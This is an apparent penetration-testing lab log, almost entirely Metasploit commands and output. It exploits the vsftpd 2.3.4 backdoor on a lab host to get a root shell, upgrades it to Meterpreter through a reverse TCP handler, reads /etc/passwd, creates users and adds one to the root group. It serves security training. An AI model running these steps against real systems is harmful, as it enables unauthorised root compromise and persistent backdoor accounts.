# Enumerating Users and Groups

```sh
msf5 > setg rhosts 192.171.24.3
rhosts => 192.171.24.3
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.171.24.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.171.24.3:21 - USER: 331 Please specify the password.
[+] 192.171.24.3:21 - Backdoor service has been spawned, handling...
[+] 192.171.24.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.171.24.2:34799 -> 192.171.24.3:6200) at 2024-01-17 10:42:54 +0000

^Z
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.171.24.2:4433 
[*] Sending stage (985320 bytes) to 192.171.24.3
[*] Meterpreter session 2 opened (192.171.24.2:4433 -> 192.171.24.3:48864) at 2024-01-17 10:43:22 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

```sh
meterpreter > shell
Process 21 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# cd /root
cd /root
root@victim-1:~# whoami
whoami
root
root@victim-1:~# groups root
groups root
root : root
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false

root@victim-1:~# cat /etc/passwd | grep -v nologin
cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
_apt:x:100:65534::/nonexistent:/bin/false

root@victim-1:~# useradd bob -s /bin/bash
useradd bob -s /bin/bash
root@victim-1:~# cat /etc/passwd | grep -v nologin
cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
_apt:x:100:65534::/nonexistent:/bin/false
bob:x:1000:1000::/home/bob:/bin/bash

root@victim-1:~# useradd -m john -s /bin/bash
useradd -m john -s /bin/bash
root@victim-1:~# ls -al /home
ls -al /home
total 12
drwxr-xr-x 1 root root 4096 Jan 17 10:49 .
drwxr-xr-x 1 root root 4096 Jan 17 10:39 ..
drwxr-xr-x 2 john john 4096 Jan 17 10:49 john

root@victim-1:~# groups
groups
root
root@victim-1:~# groups bob
groups bob
bob : bob
root@victim-1:~# usermod -aG root bob
usermod -aG root bob
root@victim-1:~# groups bob
groups bob
bob : bob root


root@victim-1:~# lastlog
lastlog
Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
games                                      **Never logged in**
man                                        **Never logged in**
lp                                         **Never logged in**
mail                                       **Never logged in**
news                                       **Never logged in**
uucp                                       **Never logged in**
proxy                                      **Never logged in**
www-data                                   **Never logged in**
backup                                     **Never logged in**
list                                       **Never logged in**
irc                                        **Never logged in**
gnats                                      **Never logged in**
nobody                                     **Never logged in**
_apt                                       **Never logged in**
bob                                        **Never logged in**
john                                       **Never logged in**
```

